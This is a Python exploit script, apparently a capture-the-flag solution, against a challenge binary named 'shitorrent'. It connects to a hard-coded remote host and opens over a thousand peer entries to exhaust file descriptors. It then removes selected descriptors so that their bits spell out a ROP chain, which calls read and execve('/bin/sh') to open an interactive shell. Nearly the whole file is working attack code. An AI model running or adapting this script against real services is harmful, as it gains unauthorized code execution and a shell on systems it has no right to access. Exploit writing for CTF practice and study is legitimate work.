#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './shitorrent'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'34.214.75.168', 'port':4747})
env.select()

#==========

binf = ELF(bin_file)
addr_bss            = binf.sep_section['.bss']
addr_syscall        = 0x00490ec5

#==========

def attack(conn, **kwargs):
    st = Shitorrent(conn)

    for _ in range(1215):
        if env.check('remote'):
            st.add('34.214.75.168', 22)
        else:
            st.add('127.0.0.1', 4747)

    rop = ROP(binf)

    exploit  = [rop.rax.address & ~1]
    exploit += [rop.rax.address, constants.SYS_read,    rop.rdi.address, 0,         rop.rsi.address, addr_bss,  rop.rdx.address, 8, addr_syscall]
    exploit += [rop.rax.address, constants.SYS_execve,  rop.rdi.address, addr_bss,  rop.rsi.address, 0,         rop.rdx.address, 0, addr_syscall]
    for _ in range(len(exploit)*8*8):
        st.add('160.16.205.124' if env.check('remote') else '127.0.0.1', 4296)

    n = 1215
    for x in exploit:
        for i in range(8*8):
            n += 1
            if (x >> i) & 1 == 0:
                st.remove(n)

    conn.sendlineafter('flag\n', 'q')
    conn.send('/bin/sh\x00')
    
class Shitorrent:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, host, port):
        self.send('a\n' + host.ljust(99,'\0') + str(port).ljust(99,'\0'))
        '''
        self.sendlineafter('flag\n', 'a')
        self.sendlineafter('host\n', host)
        self.sendlineafter('port\n', str(port))
        self.recvuntil('node ')
        return int(self.recvuntil('\n', drop=True))
        '''

    def remove(self, fd):
        self.sendlineafter('flag\n', 'r')
        self.sendline(str(fd))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
